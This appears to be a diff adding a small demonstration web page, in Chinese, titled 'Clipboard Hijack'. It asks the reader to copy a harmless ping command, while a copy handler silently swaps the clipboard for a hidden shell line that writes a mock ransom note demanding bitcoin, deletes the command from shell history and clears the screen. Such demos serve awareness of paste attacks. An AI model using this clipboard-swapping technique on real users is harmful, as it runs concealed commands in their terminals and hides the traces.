@@ -1,0 +1,44 @@
+<!doctype html>
+<html>
+<head>
+  <title>Clipboard Hijack</title>
+  <meta charset="utf-8">
+  <style>
+    pre {
+      background-color: #eee;
+      padding: 1em;
+      margin: 1em;
+    }
+    h3 {
+      margin: 1em;
+    }
+    .more {
+      margin: 0 1em;
+      font-size: 14px;
+      font-family: sans-serif;
+    }
+    .more a {
+       text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <h3>1. 选中下面内容复制粘贴到命令行运行：</h3>
+  <pre id="code">ping baidu.com</pre>
+  <script>
+    code.oncopy = function(e) {
+      var text = code.textContent
+      var s = "\n" + "echo '[温馨提示]您当前目录的文件已经被我删除\\n如果想找回，请往 *** 账号里面打 0.01 比特币，我会联系你。' > hijack && ls >> hijack && history -d $(($HISTCMD-1)) && clear\n" + text
+      navigator.clipboard.writeText(s)
+    }
+  </script>
+  <h3>2. 查看目录变化:</h3>
+  <pre>ls | grep hijack</pre>
+  <h3>3. 更多 Shell 相关教程:</h3>
+  <div class="more">
+    <a href="http://www.ruanyifeng.com/blog/2018/11/awk.html" target="_blank">1. awk 入门教程</a><br>
+    <a href="http://www.ruanyifeng.com/blog/2017/11/bash-set.html" target="_blank">2. Bash 脚本 set 命令教程</a><br>
+    <a href="https://datayi.cn/w/WoMNlgK9" target="_blank">3. 工作 2 年跳槽阿里，面试官会问哪些？</a><br>
+  </div>
+</body>
+</html>
